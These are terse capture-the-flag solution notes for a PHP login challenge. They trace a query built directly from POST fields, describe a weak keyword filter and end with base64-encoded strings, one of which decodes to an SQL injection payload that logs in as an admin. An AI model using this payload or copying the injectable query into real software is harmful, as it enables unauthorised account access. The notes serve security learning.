# key #
1. trace code 
	1. <?php if($user->is_admin) printf("<code>%s</code>, %s", htmlentities($flag1), $where_is_flag2); ?>
	2. $user = $query->fetchObject();
	3. $query = $db->query($sql);
	4. $sql = sprintf("SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'", $_POST['name'], $_POST['password']);	
2. function safe_filter($str)
	strstr  'or 1=1' || 'drop' || 'update' || 'delete'
	str_replace("'", "\\'", $str)
3. name=guest&password=guest
4. <!-- debug: -->
5. bmFtZT1udWxsJnBhc3N3b3JkPVwnIG9yIGBpc19hZG1pbmA9dHJ1ZTstLQ==
6. RkxBR3tcJyBVTklPTiBTRUxFQ1QgIkkgS25vdyBTUUwgSW5qZWN0aW9uIiAjfQ==
